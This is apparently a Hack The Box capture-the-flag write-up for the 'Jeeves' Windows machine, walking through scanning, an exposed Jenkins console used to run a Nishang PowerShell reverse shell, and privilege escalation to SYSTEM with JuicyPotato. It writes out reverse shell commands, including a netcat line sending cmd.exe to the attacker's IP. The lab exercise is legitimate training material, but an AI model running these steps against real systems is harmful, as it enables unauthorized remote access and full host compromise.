---
title:     "Hack The Box - Jeeves"
tags: [windows,medium,impersonation,jenkins]
layout: post
categories : HackTheBox
---
![847015181d928418070d5ab1f53bbb65.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-jeeves/8a5ae12d9275474e95a482457c5379e0.png)


We are going to pwn Jeeves from Hack The Box.

Link: <https://www.hackthebox.eu/home/machines/profile/114>

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results
```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2008|10|7|Vista (88%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (88%), Microsoft Windows 10 1511 - 1607 (87%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (85%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h03m53s, deviation: 0s, median: 5h03m52s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-05-22T18:06:47
|_  start_date: 2020-05-22T18:05:23
```

## HTTP Enumeration

There is nothing special in the webpage.
![834a02849181a8bbc8901cf0fd9566cb.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-jeeves/55428914b11c42c4a57528766378ad97.png)

But If we search something it displays a image is SQL error.
![6304228038c6587de74b58ce941919c6.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-jeeves/6b40b73b1c8b46c18e65c41f0932deed.png)

## Port 50000

Its running as Jetty 9.4.z-SNAPSHOT
![05d878819302dcd5daa2cd3b4d91eb77.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-jeeves/788fef45e4424ece85108e827394339b.png)
I searched for exploits and found [this](https://www.exploit-db.com/exploits/36318).
But doesn't seems like working.

I decided to bruteforce directories.
```
 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php | HTTP method: get | Threads: 10 | Wordlist size: 220521

Error Log: /root/hacking-tools/dirsearch/logs/errors-20-05-22_19-41-48.log

Target: http://jeeves.htb:50000

[19:41:48] Starting: 
[19:58:45] 302 -    0B  - /askjeeves  ->  http://jeeves.htb:50000/askjeeves/

Task Completed

```

`/askjeeves`
![37ef90ecd04197f1bed4109bc50d9097.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-jeeves/3d55fd4c08a648deb89d75b86a394143.png)
It leads to Jenkins Dashboard.
> Jenkins is a free and open source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and continuous delivery.

## Getting Shell

Select `Create New Jobs` from the dashboard.
![0d405945767dd2c6982012e51cf35e0b.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-jeeves/ffe10e094abf412a96569ecea74f86aa.png)
Create a Freestyle Project

I configure, we can see **Build -> Add Build Step -> Execute Windows Batch Command**
![5875c8c6c6e766848eed939383199541.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-jeeves/161eb4eb0be54960949561d89e274293.png)
Since we can schedule tasks, And we have command execution here.
Here I gonna use [Nishang](https://github.com/samratashok/nishang) to get reverse shell.

> Nishang is a framework of scripts and payloads that enables using PowerShell for offensive security. By using this we can get the shell.

There is a lot of Shell I choose `nishang/Shells/Invoke-PowerShellTcp.ps1` and copied that to my directory.

If we look at the Shell it gives us some of the examples.

```bash
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on
the given IP and port.
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
```

I copied one of the example and changed it to my IP and paste it in bottom of the file.
![18a3e6d578b7a31d0a0e6ae65c413d5d.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-jeeves/33b27bc32a0647a782026bc6a32f5b38.png)


Started python server in my machine
![2090246c1648e0072a5346050e6fcecb.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-jeeves/f2f5dd5fcbbe4845b163c07646942ef1.png)
Save

Now by clicking Build Now 
![ss.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-jeeves/31b219b5af314a2497a41a3c8d9284a6.png)

Our Task will be executed and I got the shell.
![b7b92082e0f61b6fc72c4f484081a5b8.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-jeeves/3e19455e84484e089d22f281d77bef13.png)




## Privilege Escalation

`whoami /all` will reveal the complete information about the user.

```ps
PS C:\Users\kohsuke\Desktop> whoami /all

USER INFORMATION
----------------

User Name      SID                                        
============== ===========================================
jeeves\kohsuke S-1-5-21-2851396806-8246019-2289784878-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```
Here we see `SeImpersonatePrivilege` is enabled. We need to do Token Impersonation attack.
>Token impersonation is a technique you can use as local admin to impersonate another user logged on to a system. This is very useful in scenarios where you are local admin on a machine and want to impersonate another logged on user, e.g a domain administrator.

I found we can use JuicyPotato for Token Impersonation attack from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#juicy-potato-abusing-the-golden-privileges)

First I downloaded [JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases) to my machine

We need to get a normal shell instead of PowerShell. Get nc.exe [here](https://github.com/int0x33/nc.exe/blob/master/nc.exe).
Upload it to the box and get revere shell.
![0b1e93ff993461f38b67e3d0603bb1d4.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-jeeves/b919770667a244718a6e0494dab040c8.png)

I created a bat file that executes nc and give me another shell.
```
C:\Users\kohsuke\Downloads>echo C:\Users\kohsuke\Downloads\nc.exe -e cmd.exe 10.10.14.12 3333 > rev.bat
echo C:\Users\kohsuke\Downloads\nc.exe -e cmd.exe 10.10.14.12 3333 > rev.bat
```


Then I ran `JuicyPotato` and it executes `bat` file 
```
C:\Users\kohsuke\Downloads>juicypotato.exe -p C:\Users\kohsuke\Downloads\rev.bat -l 3333 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
juicypotato.exe -p C:\Users\kohsuke\Downloads\rev.bat -l 3333 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} 3333
......
[+] authresult 0
{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\Users\kohsuke\Downloads>
```

It worked and I got shell as `nt authority\system`<br/>
![02dc22dc81065e2fe4c3984bd1e8b881.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-jeeves/111e7f1413c14d8589badc5db005068e.png)


When I tried to get Root Flag and it hidden.
```
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,534,071,808 bytes free

C:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
```


To see files with an alternate data stream do a `dir /R`
```
C:\Users\Administrator\Desktop>dir /R
dir /R
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
```


That `hm.txt:root.txt:$DATA` means that the file `root.txt` is inside an alternate data stream inside `hm.txt`

We can use more command to get the content easily
```
C:\Users\Administrator\Desktop>more < hm.txt:root.txt:$DATA
more < hm.txt:root.txt:$DATA
af--------------------------30
```



